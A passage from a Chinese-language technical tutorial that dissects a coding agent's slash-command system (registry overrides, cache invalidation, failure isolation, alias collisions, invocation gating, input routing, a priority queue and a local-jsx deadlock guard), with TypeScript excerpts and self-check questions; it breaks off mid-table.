这和 CSS 优先级、配置文件覆盖顺序是同一个直觉。

不过这个「用户能覆盖」不是无限的。sid-code 有一份**保护名单**
（`custom.ts` 实读，20 个名字）：

```ts
const PROTECTED_NAMES = new Set([
  "help", "h", "?", "exit", "quit", "q", "clear", "compact", "cost",
  "config", "model", "m", "undo", "memory", "mem", "sessions",
  "rewind", "stats", "init", "mcp",
]);
```

**这批名字为什么不许覆盖？** 看它们的共性：`/help`（找不到命令时的出路）、
`/exit`（退出）、`/clear`（重置）、`/config`（改配置）。
**它们是「出了问题时的逃生通道」。** 允许覆盖 `/exit` 的后果是：
一个写坏的自定义命令能让用户退不出去。

> **一个可迁移的原则**：可扩展性要留逃生通道。凡是「用来修复其他东西」的入口，
> 都不能被它要修的那个东西改掉。

### 3.4 缓存失效：必须显式，而且有个多层陷阱

缓存了就要能失效。sid-code 提供了三个入口（实读），**三个都是显式调用**：

```ts
clearCache()                 // 命令来源变了（重新加载扩展）
invalidateSkillCommands()    // skill 集合变了（插件 skills / 条件 gate 解除 / 热重载）
setDisabledSkills(names)     // 用户在 /skills 面板里禁用了某个 skill
```

第三个的注释解释了为什么必须存在：

```
构造时的 disabledSkills 是一份静态快照，运行时改配置不会自动生效。
本方法更新快照并清 cwd 缓存 —— 下次 loadAllCommands 会带新列表重新加载。
```

**这是一个通用的陷阱形态：构造时读一次的配置，运行时改了不会生效，而且不报错。**
用户在面板里点了「禁用」，UI 上那一项灰了，但命令还能用——
因为命令列表是启动时的快照。

#### 多层缓存的陷阱

CC 侧记录了一个更阴的形态（CC 调研口径，源码注释）：

```
getSkillIndex in skillSearch/localSearch.ts is a separate memoization layer
built ON TOP of getSkillToolCommands/getCommands. Clearing only the inner
caches is a no-op for the outer — lodash memoize returns the cached result
without ever reaching the cleared inners. Must clear it explicitly.
```

翻译：搜索索引（缓存 A）建在命令列表（缓存 B）之上。你清了 B，
**A 不会知道**——A 检查的是自己的 key，命中了就直接返回，
根本不会走到 B 那一层。

```
        清 B ✅
          │
          ▼
    ┌──────────┐        ┌──────────┐
    │ 缓存 A   │───X───▶│ 缓存 B   │   A 命中自己的 key 就返回，
    │（搜索索引）│  不会走 │（命令列表）│   永远到不了被清空的 B
    └──────────┘        └──────────┘
```

**判据：每加一层缓存，就要问「上面还有谁缓存了我的结果」。**
sid-code 里对应的那层是 `suggestions.ts` 的 `indexCache`，
它用的是**引用比较**而不是 key 比较，恰好绕开了这个坑：

```ts
if (indexCache?.commands === commands) {   // 比引用，不比内容
  return { fuse: indexCache.fuse, items: indexCache.items };
}
```

命令列表重建后是一个**新数组**，引用不同，索引自动失效。
**用引用当 key，让失效变成自动的** —— 这比记得手动清两层更可靠。
不过它有个前提：上层必须真的重建数组而不是原地修改。
如果哪天有人写了 `commands.push(...)`，引用没变，这个机制就静默失效了。

### 3.5 失败隔离：每个来源单独 catch

一个插件的命令文件写坏了，不能让整个命令系统起不来。sid-code 的写法（实读）：

```ts
const [customCommands, skills, builtinCommands] = await Promise.all([
  loadCustomCommands(cwd, scanOptions).catch((e) => {
    log.warn("COMMAND", `加载自定义命令失败: ${e?.message}`);
    return [] as UnifiedCommand[];        // ← 降级为空数组，不抛
  }),
  loadSkillCommands(...).catch((e) => { log.warn(...); return []; }),
  loadBuiltinCommands().catch((e) => { log.warn(...); return []; }),
]);
```

三个要点：

**① `Promise.all` + 每个分支自己 catch。** 如果不在分支里 catch，
`Promise.all` 的语义是「任一个 reject 则整体 reject」——
一个坏插件会让所有命令都加载不出来。

**② 降级为空数组而不是抛。** 用户损失的是「那一类命令」，
而不是「整个 agent 用不了」。

**③ 但要留下 `warn`。** 这条日志是唯一的线索。
静默 catch 会造成一个**极难排查**的形态：用户的自定义命令不见了，
没有任何报错，看起来就像「这个功能不支持」。

> ⚠️ **这里有个值得警惕的取舍**：降级为空数组的代价是**失败不可见**。
> `log.warn` 只进日志文件，用户不会看。所以「我的命令怎么没了」这个问题，
> 用户永远想不到要去看 debug 日志。更好的做法是在 `/doctor` 之类的
> 自检命令里把这些 warn 汇总出来 —— 让失败有一个**用户会主动去看的出口**。

### 3.6 别名冲突：比同名更阴的一种碰撞

同名命令的处理是清晰的：优先级高的赢，低的被丢。但**别名**碰撞不一样。

设想：命令 A 名叫 `commit`，别名 `["c"]`。命令 B 名叫 `clear`，别名也想要 `["c"]`。
朴素实现（`aliasMap.set(alias, cmd)`）的结果是**后写的赢**——
这叫 last-write-wins，问题是「谁后写」取决于加载顺序，
**而加载顺序会因为磁盘扫描顺序、插件安装顺序而变**。

后果：用户敲 `/c`，今天进了 `commit`，装了个插件之后进了 `clear`。
**没有任何报错**，用户只会觉得「这个工具偶尔发疯」。

sid-code 的 `dedupe` 把这两种碰撞**区别对待**（实读，注释直接写明）：

```ts
private dedupe(commands: UnifiedCommand[]): UnifiedCommand[] {
  const owner = new Map<string, string>();   // token → 首个占用它的命令名
  const result: UnifiedCommand[] = [];
  for (const cmd of commands) {
    if (owner.has(cmd.name)) continue;       // ① 同名：优先级高的已在，静默丢弃
    owner.set(cmd.name, cmd.name);
    for (const alias of cmd.aliases ?? []) {
      const existing = owner.get(alias);
      if (existing && existing !== cmd.name) {
        // ② 别名碰撞：保留先注册者 + warn 指认被谁占用
        log.warn("COMMAND",
          `别名冲突: /${alias} 已被 "${existing}" 占用，"${cmd.name}" 的该别名被忽略`);
        continue;
      }
      if (!existing) owner.set(alias, cmd.name);
    }
    result.push(cmd);
  }
  return result;
}
```

两个改进，各解决一半问题：

| | 同名（①） | 别名碰撞（②） |
| --- | --- | --- |
| 处理 | 丢弃低优先级的 | 丢弃后来者的**那个别名**（命令本身还在） |
| 日志级别 | debug（正常行为，用户主动覆盖） | **warn**（用户没打算这么干） |
| 为什么这样分 | 覆盖是用户的意图 | 碰撞是意外，且**静默劫持**风险高 |

**「确定性保留先注册者」这半是关键**：它把行为从「取决于加载顺序」
变成「取决于优先级顺序」。优先级顺序是我们定的、稳定的；加载顺序不是。

> **面试信号**：讲注册表时，能主动区分「同名」和「别名碰撞」两种碰撞、
> 并说清后者为什么更危险（静默 + 非确定性），比复述「用数组顺序做优先级」深一档。

### 3.7 MCP 命令为什么走另一条路

前五个来源都在 `loadAllCommands` 里加载并缓存。MCP 命令**不在里面**——
它作为参数传给 `getCommands`：

```ts
async getCommands(cwd: string, mcpCommands?: UnifiedCommand[]): Promise<UnifiedCommand[]>
```

调用点是这样的（`app.ts` 实读）：

```ts
const commands = await this.unifiedRegistry.getCommands(
  process.cwd(),
  buildMcpPromptCommands(this.mcpManager),   // ← 每次从 MCP 管理器现场构造
);
```

**为什么？因为 MCP 服务器的连接状态是会变的。** 它可能在会话中途连上、
中途断开、重连之后提供的命令列表还变了。`loadAllCommands` 是「加载一次、缓存住」
的语义，套不进这种动态性。

CC 的做法在结构上是同一件事（CC 调研口径）：MCP 命令存在响应式状态里
（`AppState.mcp.commands`），通过一个 React Hook（`useMergedCommands`）
在渲染层与静态命令合并、按 name 去重。

**两边都把 MCP 放在了「最外一层合并」，这是个必然而不是巧合**：
一个来源的变化频率决定了它该在哪一层合并。变得越快，合并点越靠外。

```
编译期确定 ─────────────────────────────▶ 运行时随时变
内置        自定义/Skill      插件          MCP
  │            │              │             │
  └─ 一起缓存 ─┘         独立快照      每次现场传入
                        （可热更新）
```

### 3.8 本章自检

1. 为什么「加载」缓存而「过滤」不缓存？判据是什么？
2. 用户自定义命令能覆盖内置的 `/review`，但覆盖不了 `/exit`。这两条规则各自的理由？
3. 清了缓存 B，为什么建在它上面的缓存 A 可能还是旧的？sid-code 怎么绕开的？
   它绕开的前提是什么（什么写法会让它失效）？
4. 一个插件的命令文件语法错了，会发生什么？用户能看到吗？
5. 「别名碰撞保留先注册者」比「后写的赢」好在哪？（提示：答案里要出现「确定性」）

---
<a id="s4"></a>
## §4 门控：谁能看见、谁能调用

### 4.1 为什么需要五个正交的开关

「这条命令现在能用吗」听起来是一个布尔问题。实际它是**五个独立问题**，
而且它们必须分开——合并任意两个都会立刻出现表达不了的场景。

先看这五个问题各自是什么（sid-code 的 `CommandBase` 实读）：

```ts
// === 可见性控制 ===
isEnabled?: () => boolean;          // ① 现在开着吗
isHidden?: boolean;                 // ② 出现在补全列表里吗

// === 调用控制 ===
userInvocable?: boolean;            // ③ 用户能敲 /name 吗
disableModelInvocation?: boolean;   // ④ 模型能调它吗
requiresArgs?: boolean;             // ⑤ 没参数就没法工作吗
```

**验证「必须分开」最快的办法是找一个只能靠两个字段组合表达的真实命令。**
有一批：

| 命令 | 想要的效果 | 需要的组合 |
| --- | --- | --- |
| `/btw`（旁路提问） | 用户能用；模型**不该**自己触发；**没问题就没法问** | ③=true + ④=true + ⑤=true |
| 未激活的条件 Skill | 存在于列表里，但**现在不能调**（还没被触发） | ①=false（动态） |
| 一个内部调试命令 | 知道名字的人能用，但不出现在补全里 | ②=true |
| 模型专用 Skill | prompt 是给模型写的，用户直接调没意义 | ③=false |

把 ② 和 ③ 合成一个（「隐藏 = 不可用」）会立刻毁掉第三行：
**渐进式发现**（隐藏命令仍可精确调用）就没法表达了。
把 ③ 和 ④ 合成一个会毁掉第一行和第四行——它们是**方向相反**的两种限制。

### 4.2 ①`isEnabled` —— 动态开关，且它承载了两件事

它是个**函数**而不是布尔值，这个签名本身就是设计：布尔值在定义时就固定了，
函数每次调用都重新求值。

sid-code 里它承载了两件事（`executor.ts` 的注释直接写明）：

```ts
// 对 skill 来说 isEnabled 承载两件事：/skills 禁用态，以及 P1-2 条件激活 gate
//（未触发的条件 skill 不可调用）——漏掉这层就能按名直呼绕过条件。
if (cmd.isEnabled && !cmd.isEnabled()) { ... }
```

**「按名直呼绕过条件」这句是重点**，它描述了一个具体的绕过路径：

```
条件激活 Skill 的设计意图：
  平时不出现在补全列表里，只有碰到某类文件时才激活

朴素实现：在「构造补全列表」时过滤掉未激活的
  → 补全列表里确实看不到它 ✅
  → 但用户（或模型）直接敲 /that-skill 呢？
     执行引擎不查这个条件 → 照样跑起来 ❌
```

**教训：过滤发生在「展示」层的话，「执行」层必须再查一次。**
两个层各自的入口是独立的——补全列表不是执行的必经之路。

sid-code 的注释还标了这是「兜底」：

```ts
// 启用性检查（兜底）：UnifiedCommandRegistry.getCommands 已按 isEnabled 过滤，
// 但本方法也接受调用方自备的命令数组（测试、immediate 路径、未过滤快照）。
```

**这是一个值得学的双层校验理由**：注册表已经过滤了，
但执行引擎接受**调用方传进来的数组**——测试会传自己造的、immediate 路径
会传一份可能未过滤的快照。**只要一个函数接受外部传入的数据，
它就不能假设那份数据已经被校验过。**

### 4.3 ③④ 双向控制：一个东西，两条调用路径

这是 §0.4 埋下的那个提示的兑现。因为 Skill 既能被人调也能被模型调，
需要两个方向各一个开关：

| | 用户敲 `/name` | 模型调用 |
| --- | --- | --- |
| 默认 | ✅ | ✅ |
| `userInvocable: false` | ❌ 报错「只能由模型调用」 | ✅ |
| `disableModelInvocation: true` | ✅ | ❌ 模型根本看不到它 |

**注意两种拒绝的形态不同**，这个差别不是随意的：

- 用户被拒 → **报一条错误消息**。人需要知道为什么，否则会以为工具坏了。
- 模型被拒 → **从列表里消失**，模型压根看不到。

为什么模型侧要「不可见」而不是「报错」？两个理由，第二个是省钱：

1. 模型看到一个工具就可能去调它，调了被拒会浪费一整轮往返。
2. 每个可见的工具都要占 system prompt 的 token，**每一轮都重发一遍**。
   一个模型永远调不到的工具留在 listing 里，是每轮都在付的固定成本。

sid-code 的实现（`meta-tool.ts` 实读）两处都做了：

```ts
// 列表侧：不进 listing
.filter((s) => !s.disableModelInvocation)
// 执行侧：真被调到了也拒
if (skill.disableModelInvocation) { ... }
```

**两处都做，而不是只做列表侧。** 理由和 §4.2 一样：
列表是「展示」，执行是另一个入口。模型有可能从对话历史里学到一个不在当前
listing 里的名字然后去调它。

#### 一个真实的分布，以及怎么读它

实测 sid-code 30 条已迁移内置命令里，**26 条标了 `disableModelInvocation: true`**：

```bash
$ grep -l 'disableModelInvocation: true' packages/cli/src/command/commands/*/index.ts | wc -l
26
```

**26/30 —— 这个比例高得值得停一下想想它意味着什么。**

看这些命令是什么：`/vim` `/color` `/tui` `/copy` `/statusline` `/terminal-setup`
`/keybindings` `/diff` `/doctor` `/status` `/todos` `/export` …

**它们是「人的操作」，不是「任务的步骤」。** 模型没有理由去改用户的 vim 模式
或者主题颜色。所以这个高比例不是「过度限制」，它反映了一个真实的分布：

> **一个 coding agent 的斜杠命令，大部分是给人用的界面操作，不是给模型用的能力。**
> 给模型用的能力应该走**工具**（Tool），不走命令。

反过来说：如果你发现自己在给一大批命令开放模型调用，
**那可能说明这些东西本该是工具而不是命令**（回到 §0.4 那张表）。

bundled Skill 里也有几条显式关掉模型调用，理由在源码注释里（`bundled/tool.ts`）：

```
带强副作用的 skill（commit-push-pr / pr-workflow / pr-comments）应显式
disableModelInvocation
```

**判据是「副作用能不能撤回」**：`commit-push-pr` 会推到远端、开 PR——
这是外部可见且难撤回的动作，不该由模型自行发起。

### 4.4 ⑤`requiresArgs` —— 一个很小但很好的 UX 字段

它只影响一件事：**在补全列表里按回车，是直接执行还是只回填**。

```
/btw   requiresArgs: true
       补全列表选中它 → 回车 → 输入框变成 "/btw "，光标在后面等你打问题
       （因为 /btw 没有问题就只能打印用法，直接执行是纯粹的浪费）

/model requiresArgs 不设（默认 false）
       补全列表选中它 → 回车 → 直接打开模型选择对话框
       （无参就是它的正常用法）
```

`model/index.ts` 的注释解释了为什么它**刻意不标**：

```ts
// 但补全列表回车回填后用户可继续输入，故不标 requiresArgs（保持无参可直接开对话框）。
```

**这个字段值得单独讲，因为它演示了一类容易被跳过的设计**：
「回车该执行还是该回填」听起来像 UI 细节，但**只有命令自己知道答案**
（它知道自己无参时还能不能工作）。所以这个信息必须由命令声明，
UI 层无法推断。

**一个可迁移的判据**：当你发现 UI 层在猜某个行为（「这个命令大概需要参数吧」），
那个信息就该变成契约里的一个字段。

### 4.5 CC 多出的一维：`availability`（身份门控）

CC 侧有一个 sid-code 没有的维度（CC 调研口径）。它的源码注释把区别讲得很清楚：

```
This is separate from `isEnabled()`:
  - `availability` = who can use this (auth/provider requirement, static)
  - `isEnabled()`  = is this turned on right now (GrowthBook, platform, env vars)
```

- `availability` 回答「这条命令**面向谁**」—— 一个**身份**问题。
  `/upgrade` 只对订阅用户有意义，走 Bedrock 的企业用户看到它是噪音。
- `isEnabled()` 回答「它**现在**能用吗」—— 一个**状态**问题。

**为什么 sid-code 没这一维？** 因为它没有多种账号身份要区分——
它是自部署的，接的是企业内部网关，不存在「订阅用户 vs API key 用户」这个轴。

**这是一个健康的差异，不是缺失。** 加一个永远返回 true 的维度，
比不加更糟：它会让每条新命令都要想一遍「我该填什么 availability」，
而答案永远一样。

> **面试信号**：被问「你会给命令设计哪些门控维度」时，
> 能说出「维度数量取决于产品有几种真实的用户身份 / 运行形态，
> 不是越多越好」比列举一堆字段更值钱。

### 4.6 本章自检

1. `isHidden` 和 `userInvocable: false` 都让命令「不太可见」，它们各自表达什么？
   合成一个会毁掉哪个真实场景？
2. 为什么用户被拒是「报错」，模型被拒是「不可见」？（答案里要提到 token）
3. 26/30 的命令关掉了模型调用。这个比例说明了什么？
4. 注册表已经按 `isEnabled` 过滤过了，执行引擎为什么还要再查一次？

---
<a id="s5"></a>
## §5 输入路由与命令队列：模型正忙的时候怎么办

### 5.1 三条路：这段输入到底是什么

用户在输入框敲的东西有三种可能。sid-code 的判定只有三行（`input-router.ts` 实读）：

```ts
detectMode(input: string): "prompt" | "bash" | "slash" {
  const t = input.trimStart();
  if (t.startsWith("/")) return "slash";
  if (t.startsWith("!")) return "bash";
  return "prompt";
}
```

但 `"slash"` 这个判定只是**初筛**。§1.4 说过 `/var/log/syslog` 的问题，
所以真正的分流发生在执行阶段（`executor.ts` 实读）：

```ts
const cmd = this.findCommand(parsed.commandName, commands);
if (!cmd) {
  if (looksLikeCommand(parsed.commandName)) {
    logCommandRejected("unknown_command");
    return { type: "error", message: `未知命令: /${parsed.commandName}` };
  }
  return { type: "passthrough", value: input };   // ← 当作普通文本
}
```

**`passthrough` 这个返回值是关键设计。** 它的意思是「我认不出来，
但这不像个命令名，所以别报错——原样交给模型」。于是：

```
/var/log/syslog  → 含 "/"，looksLikeCommand 为 false → passthrough → 模型看到这段文字
/xyzabc          → 像命令名，但没有 → 报错「未知命令: /xyzabc」
```

#### 一处两个实现的选择分叉

`/xyzabc` 该报错还是该 passthrough？这不是技术问题，是产品判断：

| | 报错（sid-code 本地路径） | passthrough |
| --- | --- | --- |
| 用户打错字 `/compct` | 立刻知道打错了 ✅ | 模型收到一句莫名的 `/compct` ❌ |
| 用户在说别的 `/shrug` | 被莫名拒绝 ❌ | 正常发出去 ✅ |

CC 侧的做法（CC 调研口径）在这里更细一层：**看输入来源**。
从手机端（Remote Control）发来的未知命令按 passthrough 处理，
理由记在源码注释里——手机用户输入 `/shrug` 不该报错。
本地终端则报错，因为本地用户敲 `/` 通常真的是在找命令。

**这个「按来源区分」是个好范式**：同一个歧义，在不同入口有不同的最可能意图。

#### 一个漂亮的埋点设计

注意上面那段代码里的 `logCommandRejected("unknown_command")`。
它的注释（`analytics/events.ts` 实读）值得整段读：

```
unknown_command 的分布能直接看出「用户以为存在但其实没有」的功能——
这是功能缺口的一手信号。刻意**不上报用户输入的那个名字**：它是自由文本，
可能含路径或私有名称。要看具体名字请查本地日志。
```

**两个点**：

**① 这是个需求发现渠道。** 用户敲了一个不存在的命令，
说明他期待这个功能存在。这批数据比任何用户调研都直接。

**② 但不能上报那个名字。** 用户可能敲了 `/deploy-to-acme-prod`——
含客户名。所以只上报「发生了一次 unknown_command」这个事实，
名字留在本地日志里。

同一份注释还写了分母口径，这条比上面两点更容易搞错：

```
分母提示：这条的分母是「用户敲下的斜杠命令总数」（≈ command_invoke + command_rejected），
用全量会话数当分母会把 unknown_command 率稀释到看不见。
```

**这就是「分母比分子重要」在这里的具体形态**：
`unknown_command / 全部会话数` 会是个极小的数（大部分会话一次都不敲错），
看起来「没问题」；而 `unknown_command / 全部斜杠命令` 才是真实的错敲率。
**同一个分子，两个分母，一个能指导决策，一个会让你放弃这个信号。**

### 5.2 调度：模型正忙时的三种处置

这是斜杠命令区别于普通 CLI 的核心复杂度（回到 §0.1 那个「有状态的进程」）。

用户敲命令的那一刻，模型可能正在流式输出。三种处置（`input-router.ts` 实读）：

```ts
async handleInput(input, isModelActive, commands): Promise<"immediate"|"enqueued"|"executed"> {
  // Step 1: 模型运行时，检测 immediate 斜杠命令 → 插队
  if (isModelActive && input.trim().startsWith("/")) {
    const parsed = parseSlashCommand(input);
    if (parsed) {
      const cmd = this.deps.executor.findCommand(parsed.commandName, commands);
      if (cmd?.immediate && cmd.userInvocable !== false) {
        const result = await this.deps.executor.executeImmediate(cmd, parsed.args);
        this.deps.onImmediateResult?.(result);
        return "immediate";
      }
    }
  }
  // Step 2: 模型运行中 → 入队
  if (isModelActive) {
    this.deps.queue.enqueue({ value: input, mode: this.detectMode(input) });
    return "enqueued";
  }
  // Step 3: 模型空闲 → 直接执行
  await this.deps.runInput(input);
  return "executed";
}
```

#### 为什么必须有 `immediate` 这条插队路径

考虑这个场景，它是真实的痛点：

```
用户：帮我重构这个模块      ← 模型开始跑，可能要两分钟
用户（10 秒后）：诶不对，这个任务该用更强的模型
        ↓
        敲 /model
        ↓
    没有 immediate：入队 → 等两分钟 → 才切换 → 但那个任务已经用旧模型跑完了
    有 immediate：  立刻切换 ✅
```

**判据：这条命令的价值会不会因为延迟执行而消失？**
`/model` `/effort` `/think` `/fast`（都是调节模型行为的旋钮）
延迟执行就完全没意义了——你要调的那次调用已经结束了。

实测 sid-code 30 条里 **27 条标了 `immediate: true`**，
不标的只有三条 —— 而这三条恰好构成了完整的判据：

```bash
$ for f in commands/*/index.ts; do grep -q 'immediate: true' $f || basename $(dirname $f); done
btw
compact
loop
```

| 不标 immediate 的 | 为什么不能插队 |
| --- | --- |
| `/compact` | 它要**替换整个消息列表**。模型正在往里写，插队执行 = 数据竞争 |
| `/btw` | 它 fork 一个共享当前上下文的子代理 —— 上下文正在被写 |
| `/loop` | 它要建立一个循环调度，跟正在跑的这一轮语义冲突 |

**共同点一句话：会改动「模型正在读写的那份状态」的命令，不能插队。**
只读的、只改旁路开关的，可以。

**这个判据比「哪些命令标 immediate」这个列表值钱得多**，因为它可迁移：
你自己设计时照这条判就行。

#### CC 侧多一条限制，值得对照

CC 的 immediate 只允许 `local-jsx` 类型（CC 调研口径）。理由：

```
prompt 类型的命令如果 immediate 执行，会向对话注入消息，破坏正在进行的 API 调用。
```

**这跟上面那条判据是同一件事的不同表达**：`prompt` 命令的动作就是「往对话里塞消息」，
而对话正在被读。CC 用「类型」做限制（粗但机械可查），
sid-code 用「命令自己声明」（细但依赖每条命令判断对）。

两种都行，但**它们的失效方式不同**：CC 的会误拦一个本来安全的 prompt 命令；
sid-code 的会漏放一个标错了的命令。前者是保守失效，后者是危险失效。
**如果让我选，我会两条都要**：类型做硬限制，声明做细化——
只在类型允许的范围内让命令自己声明。

### 5.3 队列：三级优先级，以及它防的是什么

队列本身很简单（`queue.ts` 实读，102 行）。有意思的是三级优先级：

```ts
export type QueuePriority = "now" | "next" | "later";
const PRIORITY_ORDER: Record<QueuePriority, number> = { now: 0, next: 1, later: 2 };

enqueue(cmd)             { ... priority: cmd.priority ?? "next"  }   // 用户输入
enqueueNotification(cmd) { ... priority: cmd.priority ?? "later" }   // 系统通知
```

两个入口，两个不同的默认值。**这个默认值差异就是整个设计**：

| 优先级 | 谁用 | 例子 |
| --- | --- | --- |
| `now` | 紧急系统事件 | （预留） |
| `next` | **用户输入**（默认） | 用户敲的命令和对话 |
| `later` | **系统通知**（默认） | 后台任务完成、定时任务触发 |

**它防的是一个具体场景**：

```
用户开了 5 个后台子代理。它们陆续跑完，每个都要往队列里塞一条「我完成了」。
同时用户敲了一条新指令。

单级 FIFO：用户那条排在 5 条通知后面 → 用户觉得「我按了回车没反应」
三级：     用户那条是 next，通知是 later → 用户先被处理 ✅
```

**一句话：用户输入永远不该被系统通知饿死。**

出队实现是「扫一遍找优先级最高的」（O(n) 线性扫描）而不是堆：

```ts
dequeue(): QueuedCommand | undefined {
  let bestIdx = 0;
  let bestPriority = PRIORITY_ORDER[this.queue[0].priority];
  for (let i = 1; i < this.queue.length; i++) { ... }
  const [dequeued] = this.queue.splice(bestIdx, 1);
}
```

**这是对的取舍，值得说清楚为什么**：队列长度实际是个位数
（人手打字的速度 + 后台任务数量）。O(n) 扫 5 个元素比维护一个堆快，
而且代码少一半、不会写错。**优先队列这种数据结构在 n<100 时是负资产。**

同优先级内是 FIFO —— 因为 `splice` 取的是第一个达到最高优先级的下标，
后面同优先级的不会被提前。

### 5.4 队列处理器：触发条件里有一条容易漏

处理器本身只有 36 行（`queue-processor.ts` 实读）：

```ts
processNext(): boolean {
  const cmd = this.deps.queue.dequeue();
  if (!cmd) return false;
  this.deps.runInput(cmd.value);
  return true;
}
```

真正的逻辑在**什么时候调它**。三个条件（源码注释，由 UI 层的 `useQueueProcessor` 保证）：

```
1. 模型空闲（isModelActive === false）
2. 无交互式 UI 在显示（如 /config 对话框）      ← 这条最容易漏
3. 队列非空
```

**第 2 条为什么必须有？** 想象漏了它的后果：

```
用户敲 /model → 弹出模型选择对话框，用户正在上下选
队列里还有一条排队的输入
       ↓
处理器发现「模型空闲 + 队列非空」→ 执行那条输入
       ↓
那条输入触发了一次模型调用 / 或者又弹一个对话框
       ↓
用户面前：两个对话框叠着，或者选择器突然消失
```

**这条的普适形态是：「空闲」不等于「可以开始新工作」。**
还要问「有没有正在等用户操作的东西」。这类 bug 的特征是**只在有人真的慢慢操作时才复现**——
自动化测试里对话框瞬间关闭，永远撞不上。

### 5.5 一个必须讲的取舍：斜杠命令为什么不能批量处理

CC 侧有一个 sid-code 没做的优化（CC 调研口径）：普通文本可以**批量**出队，
斜杠命令必须**逐条**。

```
普通文本：连续 3 条 → 拼成一个 API 请求 → 省 2 次往返 ✅
斜杠命令：必须一条一条 → 为什么？
```

因为斜杠命令会**改变系统状态**。批量执行 `/compact` + `/clear` + `/model opus`
的话，三条命令对状态的修改会互相干扰，而且**执行顺序的效果不可预测**
（`/compact` 压缩的是 `/clear` 之前还是之后的对话？）。

sid-code 的处理器一次只取一条（对所有 mode 都是），
源码注释说明这是刻意的：

```
处理策略：每次取出优先级最高的一条交给应用层执行（runInput）。
斜杠/bash 命令可能改变系统状态，单独逐条处理而非批量合并。
```

**这是一个「用性能换正确性」的取舍，而且方向是对的**：
批量的收益是省几次 API 往返（几百毫秒），
代价是引入一类**极难复现**的状态竞争 bug。

### 5.6 本章自检

1. `passthrough` 这个返回值解决什么问题？为什么不能统一报错？
2. `unknown_command` 这个埋点为什么不上报用户输入的名字？它的分母该是什么，
   用错分母会怎样？
3. `/compact` `/btw` `/loop` 是唯三不标 `immediate` 的。它们的共同点是什么？
   （答案要能推广成一条判据）
4. 队列处理器的三个触发条件里，「无交互式 UI」那条漏了会怎样？
   为什么这个 bug 在自动化测试里撞不到？
5. 为什么普通文本能批量、斜杠命令不能？

---
<a id="s6"></a>
## §6 执行引擎：三条路径的细节

### 6.1 分发本身很小，重点在每条路径里

执行引擎的分发只有 8 行（`executor.ts` 实读）：

```ts
private dispatch(cmd: UnifiedCommand, args: string): Promise<CommandExecutionResult> {
  logCommandInvoke({ ... });                                  // ← 埋点，见 6.2
  switch (cmd.type) {
    case "local":     return this.executeLocal(cmd, args);
    case "local-jsx": return this.executeLocalJSX(cmd, args);
    case "prompt":    return this.executePrompt(cmd, args);
  }
}
```

**没有 `default` 分支，这是刻意的**：判别联合已经穷尽了三种可能，
加 `default` 会让「以后新增第四种时编译器报错」这个保护失效
（有 default 就永远能编译过，新形态会静默走进 default）。

### 6.2 埋点埋在哪一层，是个有教训的选择

上面那个 `logCommandInvoke` 的位置有注释解释（实读），值得整段读：

```
埋在 dispatch 而非 executeSlashCommand，是为了同时覆盖 executeImmediate
（模型运行时插队执行）这条路径——只埋前者会漏掉插队调用，让统计偏低且偏得静默。
```

看清这两条路径的形状就知道为什么：

```
       executeSlashCommand()          executeImmediate()
       （正常路径：解析→查找→门控）      （插队路径：直接分发）
                  │                          │
                  └────────────┬─────────────┘
                               ▼
                          dispatch()   ← 埋在这里，两条都覆盖
```

**「偏低且偏得静默」是这类 bug 的标准形态。** 埋在
`executeSlashCommand` 里，数据照样有、图照样画，只是 `/model` `/effort`
这类高频 immediate 命令的调用量系统性偏低——**而你不会知道**，
因为没有任何东西会告诉你「有一条路径没埋」。

**可迁移的判据：埋点要埋在所有路径的汇聚点，不是第一个入口。**
找汇聚点的方法：画出所有能到达目标动作的调用链，找它们的最后一个公共节点。

同一处埋点的脱敏规则也值得抄（实读注释）：

```
内置命令名是固定枚举（/model、/compact…），不含用户数据，可明文；
自定义 / skill / plugin 命令名由用户定义，**可能含项目或客户名**，
只上报 "custom" 占位，真名进 _PROTECTED_ 通道仅特权后端可见。
```

**判据是「这个字符串的取值空间是我们定的，还是用户定的」。**
固定枚举安全，自由文本不安全。这条比「命令名应该脱敏」这种笼统说法可操作得多。

### 6.3 ★ `local-jsx` 的死锁：本章最重要的一段

这是整个命令系统里最容易写错的 40 行。先说清**为什么会死锁**。

#### 问题的根源：一个函数，两个出口

`local-jsx` 命令有两个出口（§2.2 说过）：

```
call(onDone, ctx, args) → 返回一个 React 界面     ← 出口 A：函数 return
                        → 后来某时刻调用 onDone()  ← 出口 B：用户操作完
```

而执行引擎必须给上层一个 `Promise`（因为「命令执行完了」是个单一事件）。
所以它把 `onDone` 包成 `resolve`：

```ts
return new Promise<CommandExecutionResult>((resolve) => {
  const onDone = (result, options) => { ...; resolve({...}); };
  cmd.load().then((mod) => mod.call(onDone, this.ctx, args)).then((jsx) => { ... });
});
```

**死锁就在这里：如果 `onDone` 永远不被调用，这个 Promise 永远不 resolve。**
而 `await executor.executeSlashCommand(...)` 的调用方就永远挂着——
它下面还有「队列处理器等着这一条完成才处理下一条」。

**后果不是崩溃，是整个输入系统卡死**：用户敲什么都没反应，进程还活着，CPU 是 0%。
这是最难排查的一类故障——**没有报错、没有堆栈、没有日志**。

#### 三种让 `onDone` 永不被调用的路径

```
① cmd.load() 抛异常          → 模块文件语法错了 / 路径写错了
② mod.call() 抛异常          → 命令自己的代码炸了
③ 命令的界面代码有 bug       → 界面画出来了，但没有任何按键路径通向 onDone
```

前两种是引擎能防的，第三种防不了（那是命令自己的 bug）。
sid-code 的防护（实读，我把关键处标出来）：

```ts
private executeLocalJSX(cmd, args): Promise<CommandExecutionResult> {
  return new Promise<CommandExecutionResult>((resolve) => {
    let doneWasCalled = false;                              // ★ 守卫标志

    const onDone: LocalJSXCommandOnDone = (result, options) => {
      if (doneWasCalled) return;                            // ★ 防重复 resolve
      doneWasCalled = true;
      this.callbacks.setToolJSX?.(null);                    // 关闭界面
      if (options?.display === "skip") { resolve({ type: "skip" }); return; }
      resolve({ type: "message", value: result ?? "", shouldQuery: options?.shouldQuery ?? false });
    };

    cmd.load()
      .then((mod) => mod.call(onDone, this.ctx, args))
      .then((jsx) => {
        if (jsx && !doneWasCalled) {                        // ★ 早退保护
          this.callbacks.setToolJSX?.(jsx);
        }
      })
      .catch((e) => {
        // 异常兜底：必须 resolve，否则队列处理器死锁
        if (!doneWasCalled) {                               // ★ 兜底 resolve
          doneWasCalled = true;
          this.callbacks.setToolJSX?.(null);
          resolve({ type: "error", message: `命令执行失败: ${...}` });
        }
      });
  });
}
```

**四处 `doneWasCalled` 检查，各防一件不同的事**：

| 位置 | 防什么 | 不加会怎样 |
| --- | --- | --- |
